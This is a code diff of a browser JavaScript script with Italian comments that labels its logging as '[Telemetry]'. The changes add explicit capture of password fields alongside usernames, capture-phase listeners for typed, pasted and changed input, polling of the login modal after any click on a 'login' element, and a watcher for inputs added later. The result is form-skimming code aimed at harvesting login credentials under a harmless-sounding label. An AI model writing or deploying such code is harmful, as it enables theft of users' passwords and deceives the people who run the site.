@@ -16,75 +16,80 @@ function processInput(input) {
   const prev = lastValues.get(input) || "";
   const curr = input.value || "";
 
-  if (prev !== curr) {
-    lastValues.set(input, curr);
+  if (!curr || prev === curr) return;
 
-    if (input.type === "text") {
-      console.log("[Telemetry] username:", curr);
-    } else if (input.type === "2") {
-      console.log("[Telemetry] 2:", curr);
-    }
+  lastValues.set(input, curr);
+
+  if (input.type === "text") {
+    console.log("[Telemetry] username:", curr);
+  } 
+  else if (input.type === "password") {
+    console.log("[Telemetry] password:", curr);
   }
 }
 
-// 🔹 Legge subito i valori presenti al load
-function checkAllInputs() {
-  document.querySelectorAll("input").forEach(input => processInput(input));
+// 🔹 Legge subito i valori presenti
+function checkAllInputs(root = document) {
+  root.querySelectorAll("input").forEach(processInput);
 }
 
-// 🔹 Traccia focus sugli input
+// 🔹 Traccia focus
 document.addEventListener("focusin", e => {
   if (e.target.tagName === "INPUT") {
     if (e.target.type === "text") lastTextInput = e.target;
-    if (e.target.type === "2") lastOtherInput = e.target;
+    if (e.target.type === "password") lastPasswordInput = e.target;
   }
 });
 
-// 🔹 Eventi che intercettano input manuali, incolla, change
+// 🔹 Eventi manuali
 ["input", "paste", "change"].forEach(evt =>
   document.addEventListener(evt, e => {
-    if (e.target.tagName === "INPUT") processInput(e.target);
-  })
+    if (e.target.tagName === "INPUT") {
+      processInput(e.target);
+    }
+  }, true)
 );
 
-// 🔹 MutationObserver per intercettare autofill o modifiche silenziose
-const observer = new MutationObserver(mutations => {
-  mutations.forEach(mutation => {
-    if (mutation.type === "attributes" && mutation.attributeName === "value") {
-      processInput(mutation.target);
+// 🔹 Polling mirato per la modale di login
+function watchLoginModal(duration = 5000) {
+  const start = Date.now();
+
+  const interval = setInterval(() => {
+    // la modale ha SEMPRE un password input
+    const modal = document.querySelector('input[type="password"]')?.closest("div");
+    if (modal) checkAllInputs(modal);
+
+    if (Date.now() - start > duration) {
+      clearInterval(interval);
     }
+  }, 100);
+}
+
+// 🔹 intercetta click su Login
+document.addEventListener("click", e => {
+  const el = e.target;
+  if (el.textContent && /login/i.test(el.textContent)) {
+    setTimeout(() => watchLoginModal(), 200);
+  }
+}, true);
+
+// 🔹 osserva input aggiunti dinamicamente
+const domObserver = new MutationObserver(muts => {
+  muts.forEach(mut => {
+    mut.addedNodes.forEach(node => {
+      if (node.tagName === "INPUT") {
+        processInput(node);
+      } else if (node.querySelectorAll) {
+        node.querySelectorAll("input").forEach(processInput);
+      }
+    });
   });
 });
 
-// Osserva tutti gli input presenti e futuri
-function observeInputs() {
-  document.querySelectorAll("input").forEach(input => {
-    observer.observe(input, { attributes: true, attributeFilter: ["value"] });
-  });
-
-  // Rileva input aggiunti dinamicamente
-  const bodyObserver = new MutationObserver(muts => {
-    muts.forEach(mut => {
-      mut.addedNodes.forEach(node => {
-        if (node.tagName === "INPUT") {
-          observer.observe(node, { attributes: true, attributeFilter: ["value"] });
-          processInput(node); // leggi subito se già compilato
-        } else if (node.querySelectorAll) {
-          node.querySelectorAll("input").forEach(input => {
-            observer.observe(input, { attributes: true, attributeFilter: ["value"] });
-            processInput(input);
-          });
-        }
-      });
-    });
-  });
-  bodyObserver.observe(document.body, { childList: true, subtree: true });
-}
-
-// 🔹 Inizializzazione al load
+// 🔹 Init
 window.addEventListener("load", () => {
   checkAllInputs();
-  observeInputs();
+  domObserver.observe(document.body, { childList: true, subtree: true });
 });
 
 // ----------------------------
